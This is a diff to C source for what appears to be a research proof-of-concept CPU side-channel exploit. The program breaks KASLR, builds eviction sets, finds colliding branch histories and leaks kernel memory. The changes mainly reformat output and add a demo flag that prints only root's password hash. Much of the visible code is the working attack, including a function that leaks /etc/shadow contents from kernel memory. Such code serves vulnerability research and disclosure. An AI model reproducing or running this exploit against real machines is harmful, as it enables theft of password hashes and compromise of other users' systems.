@@ -36,6 +36,9 @@
 #define MAX_SHADOW_LENGTH 0x1000
 #define DEFAULT_SHADOW_SYMBOL '$'
 
+// for demo purposes: set to 1 to fit on screen
+#define LEAK_ONLY_ROOT_HASH 0
+
 
 void load_shadow_file() {
     // ------------------------------------------------------------------------
@@ -73,7 +76,7 @@ void leak_shadow_file(struct config * cfg, char shadow_symbol) {
     strcpy(leaked_bytes, "root:");
 
     printf("Finding prefix 0x%08x\n", *(uint32_t *) leaked_bytes);
-    printf("\rTesting address: %p [%50s]", secret_kern, "");
+    printf("\rTesting address: %p [%40s]", secret_kern, "");
 
     int step = 0;
     fflush(stdout);
@@ -90,9 +93,9 @@ void leak_shadow_file(struct config * cfg, char shadow_symbol) {
             printf("\rTesting address: %p ", secret_kern);
             fflush(stdout);
 
-            if ((secret_kern -  cfg->phys_start) > (((cfg->phys_end - cfg->phys_start) / 50) * step)) {
+            if ((secret_kern -  cfg->phys_start) > (((cfg->phys_end - cfg->phys_start) / 40) * step)) {
                 step++;
-                printf("[%.*s", step, "..................................................");
+                printf("[%.*s", step, "........................................");
                 fflush(stdout);
             }
         }
@@ -129,8 +132,8 @@ void leak_shadow_file(struct config * cfg, char shadow_symbol) {
         }
 
         if(found != shadow_symbol) {
-            printf("\r    >> Found 'root:%c' (0x%02x) at address, skipping..: %p\n",
-                found >= 0x20 && found <= 0x7E ? found : ' ', found, secret_kern);
+            printf("\r    >> Found 'root:%c' (0x%02x) at address, skipping..: %p %20s\n",
+                found >= 0x20 && found <= 0x7E ? found : ' ', found, secret_kern, "");
             continue;
         }
 
@@ -151,7 +154,13 @@ void leak_shadow_file(struct config * cfg, char shadow_symbol) {
     uint8_t * cur_byte = (uint8_t *) leaked_bytes + 5;
     *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET + 2;
 
+#if (LEAK_ONLY_ROOT_HASH == 0)
     printf("\nShadow content:\n");
+#else
+    printf("\nPassword hash of root:\n");
+#endif
+
+
     printf("============================================================\n");
     printf("%s", leaked_bytes);
     fflush(stdout);
@@ -171,6 +180,13 @@ void leak_shadow_file(struct config * cfg, char shadow_symbol) {
         if (*cur_byte == '\0') {
             break;
         }
+
+#if (LEAK_ONLY_ROOT_HASH == 1)
+        if (*cur_byte == '\n') {
+            break;
+        }
+#endif
+
 
         printf("%c", *cur_byte >= 0xa && *cur_byte < 0x7E ? *cur_byte : '.');
         fflush(stdout);
@@ -422,9 +438,10 @@ int main(int argc, char **argv)
     // ------------------------------------------------------------------------
     // Find Eviction set for syscall table
 
-    printf("------------------------------------------------------\n");
-    printf("Finding eviction set for syscall table\n");
-    printf("------------------------------------------------------\n");
+
+    printf("-----------------------------------------------------------------------------\n");
+    printf("1) Finding eviction set for syscall table\n");
+    printf("-----------------------------------------------------------------------------\n");
 
     time_start = time(0);
 
@@ -435,9 +452,9 @@ int main(int argc, char **argv)
     // ------------------------------------------------------------------------
     // Find the physical map start by KASLR break
 
-    printf("------------------------------------------------------\n");
-    printf("Find physical map start address\n");
-    printf("------------------------------------------------------\n");
+    printf("-----------------------------------------------------------------------------\n");
+    printf("2) Find physical map start address\n");
+    printf("-----------------------------------------------------------------------------\n");
     time_start = time(0);
 
     for (size_t i = 0; i < 5 && cfg.phys_start == 0; i++)
@@ -485,6 +502,7 @@ int main(int argc, char **argv)
             sleep(1);
             cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
         }
+        printf("-----------------------------------------------------------------------------\n");
         printf("User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);
 
         // initialize honey pages
@@ -498,9 +516,9 @@ int main(int argc, char **argv)
 
         time_start = time(0);
         // find the kernel address of the huge page
-        printf("------------------------------------------------------\n");
-        printf("Finding huge page kernel address\n");
-        printf("------------------------------------------------------\n");
+        printf("-----------------------------------------------------------------------------\n");
+        printf("3) Finding huge page kernel address\n");
+        printf("-----------------------------------------------------------------------------\n");
 
         if (find_hp_kern_address(&cfg, 0) != 0) {
             printf("Failed finding the huge page kernel address! please restart\n");
@@ -519,9 +537,9 @@ int main(int argc, char **argv)
     // ------------------------------------------------------------------------
     // Find a colliding history
 
-    printf("------------------------------------------------------\n");
-    printf("Find a colliding history for the victim -> target\n");
-    printf("------------------------------------------------------\n");
+    printf("-----------------------------------------------------------------------------\n");
+    printf("4) Find a colliding history for the victim -> target\n");
+    printf("-----------------------------------------------------------------------------\n");
     time_start = time(0);
 
     find_colliding_history(&cfg);
@@ -540,9 +558,9 @@ int main(int argc, char **argv)
 
     switch (leak_mode) {
     case 0:
-        printf("------------------------------------------------------\n");
-        printf("Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
-        printf("------------------------------------------------------\n");
+        printf("-----------------------------------------------------------------------------\n");
+        printf("5) Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
+        printf("-----------------------------------------------------------------------------\n");
 
         time_start = time(0);
         leak_test_leakage_rate(&cfg);
@@ -550,9 +568,9 @@ int main(int argc, char **argv)
         break;
     case 1:
 
-        printf("------------------------------------------------------\n");
-        printf("Leaking Dummy secret\n");
-        printf("------------------------------------------------------\n");
+        printf("-----------------------------------------------------------------------------\n");
+        printf("5) Leaking Dummy secret\n");
+        printf("-----------------------------------------------------------------------------\n");
 
         time_start = time(0);
         leak_dummy_secret(&cfg);
@@ -560,9 +578,9 @@ int main(int argc, char **argv)
         break;
     case 2:
 
-        printf("------------------------------------------------------\n");
-        printf("Leaking shadow file \n");
-        printf("------------------------------------------------------\n");
+        printf("-----------------------------------------------------------------------------\n");
+        printf("5) Leaking shadow file \n");
+        printf("-----------------------------------------------------------------------------\n");
 
         time_start = time(0);
         leak_shadow_file(&cfg, shadow_symbol);
